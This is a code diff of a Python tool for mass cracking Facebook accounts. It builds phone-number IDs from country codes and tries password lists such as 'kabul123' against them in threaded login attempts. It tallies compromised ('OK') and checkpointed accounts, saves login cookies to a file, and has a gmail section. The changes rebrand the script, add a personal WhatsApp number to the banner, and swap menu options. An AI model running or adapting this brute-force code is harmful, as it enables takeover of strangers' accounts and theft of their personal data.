@@ -116,6 +116,7 @@ logo=("""\033[1;32m
 \033[1;93m--------------------------------------------------
   \033[1;32mF4C3B00K  : Raziqullah Saadat
   \033[1;32mY0UTUB3   : @Saadat
+  \033[1;37m[-] WhatsApp  :\033[1;32m +93702856593
   \033[1;32mV3RS10N   : 0.7
   \033[1;32m0WN3R     : Raziqullah Saadat
 --------------------------------------------------
@@ -143,22 +144,7 @@ def cek_apk(session,coki):
 	sop = BeautifulSoup(w,"html.parser")
 	x = sop.find("form",method="post")
 	game = [i.text for i in x.find_all("h3")]
-	if len(game)==0:
-		print(f'\r%s [%sâ€¢%s] %sActive Apks & Web Not Found %s		'%(N,H,N,H,N))
-	else:
-		print(f'\r{A} [â€¢]%s Active Apks & Web ðŸ‘‡ '%(H))
-		for i in range(len(game)):
-			print(f"\r%s [%s] %s %s "%(D,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),D))
-	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
-	sop = BeautifulSoup(w,"html.parser")
-	x = sop.find("form",method="post")
-	game = [i.text for i in x.find_all("h3")]
-	if len(game)==0:
-		print(f'\r%s [%sâ€¢%s] %sExpired Apks & Web Not Found %s		'%(N,M,N,M,N))
-	else:
-		print(f'\r{A} [â€¢]%s Expired Apks & Web ðŸ‘‡ '%(M))
-		for i in range(len(game)):
-			print(f"\r%s [%s] %s %s "%(C,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),A))
+	
 loop=0
 oks=[]
 cps=[]
@@ -253,7 +239,7 @@ def public():
 		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
 		linex()
 		input(' Press enter to back ')
-		os.system('python Raziq.py')
+		os.system('python Arman.py')
 	except requests.exceptions.ConnectionError:
 		exit(f' No internet connection')
 	except (KeyError,IOError):
@@ -391,7 +377,7 @@ def manual_file(cookies,access_token):
     print(' Total ids grabbed: '+str(len(ids)))
     print(' Ids file saved in: '+sf)
     input(' \nPress enter to back ')
-    os.system('python Raziq.py')
+    os.system('python Arman.py')
 def sids():
     os.system('clear')
     print(logo)
@@ -417,7 +403,7 @@ def sids():
     print(' New file saved as: '+new_save)
     print(50*'-')
     input('\n Press enter to back ')
-    os.system('python Raziq.py')
+    os.system('python Arman.py')
 def remove_dub():
     os.system('clear')
     print(logo)
@@ -434,7 +420,7 @@ def remove_dub():
         print(' Result file saved as: '+save_file)
         print(50*'-')
         input('\n Press enter to back ')
-        os.system('python Raziq.py')
+        os.system('python Arman.py')
     except FileNotFoundError:
         print(' File not found.')
 def login():
@@ -450,7 +436,7 @@ def login():
         open("fb_cookies.txt","w").write(cookies)
         print(' Logged in successfully ...')
         time.sleep(1)
-        os.system('python Raziq.py')
+        os.system('python Arman.py')
     except KeyError:
         print('\n Inavlid cookies, try another cookies')
         exit()
@@ -522,7 +508,7 @@ def menu():
 		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
 		linex()
 		input(' Press enter to back ')
-		os.system('python Raziq.py')
+		os.system('python Arman.py')
 	elif xd in ['2','02']:
 		create_file_login()
 	elif xd in ['3','03']:
@@ -567,7 +553,7 @@ def pak():
 		except ValueError:
 			limit = 5000
 		linex()
-		print(' [2] Method 2 Best ')
+		print(' [1] Method 1 Best ')
 		linex()
 		mthd = input(' Choose: ')
 		linex()
@@ -586,13 +572,13 @@ def pak():
 			linex()
 			for psx in user:
 				ids = code+psx
-				if pcs in ['1','01']:
+				if pcs in ['2','02']:
 					passlist = [psx,ids]
-				elif pcs in ['2','02']:
+				elif pcs in ['1','01']:
 					passlist = [psx,ids,'afghan123','khan123','kabul123','۱۲۳۴۵۶']
 				else:
 					passlist = [psx,ids,'afghan123','khan123','786786','kabul1234','kabul123','۱۲۳۴۵۶','afghanistan','khost12']
-				if mthd in ['1','01']:
+				if mthd in ['2','02']:
 					AXI.submit(rcrack1,ids,passlist)
 				else:
 					AXI.submit(rcrack,ids,passlist)
@@ -602,7 +588,7 @@ def pak():
 		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
 		linex()
 		input(' Press enter to back ')
-		os.system('python Raziq.py')
+		os.system('python Arman.py')
 def bd():
 		user=[]
 		clear()
@@ -639,7 +625,7 @@ def bd():
 		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
 		linex()
 		input(' Press enter to back ')
-		os.system('python Raziq.py')
+		os.system('python Arman.py')
 def gmail():
 		os.system('rm -rf .re.txt')
 		clear()
@@ -712,7 +698,7 @@ def gmail():
 		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
 		linex()
 		input(' Press enter to back ')
-		os.system('python Raziq.py')
+		os.system('python Arman.py')
  
 def ffb(ids,names,passlist):
 	global loop,oks,cps
